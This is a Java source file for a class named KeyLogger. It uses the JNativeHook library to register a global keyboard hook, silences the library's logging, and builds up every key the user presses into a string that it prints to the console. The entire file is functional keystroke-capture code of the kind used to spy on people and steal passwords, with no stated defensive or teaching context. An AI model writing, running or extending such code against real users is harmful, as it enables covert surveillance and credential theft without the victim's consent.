package Main;

import java.util.logging.Logger;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {
	
	private String textEntered;
	
	public KeyLogger() {
		textEntered = "";
	}

    public static void main(String[] args) {
    	KeyLogger keyLogger = new KeyLogger();
    	
        try {
            GlobalScreen.registerNativeHook();
        } 
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new KeyLogger());
        keyLogger.disableConsoleLogger();
    }
    
    public void disableConsoleLogger() {
    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);
    }

	@Override
	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
		
		switch(keyPressed) {
			case "Space" :
				keyPressed = " ";
				break;
			case "Shift" :
				keyPressed = "";
				break;
			case "Period" :
				keyPressed = ".";
				break;
		}

		textEntered += keyPressed;
		System.out.println(textEntered);
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent keyEvent) {}

	@Override
	public void nativeKeyTyped(NativeKeyEvent keyEvent) {}
}



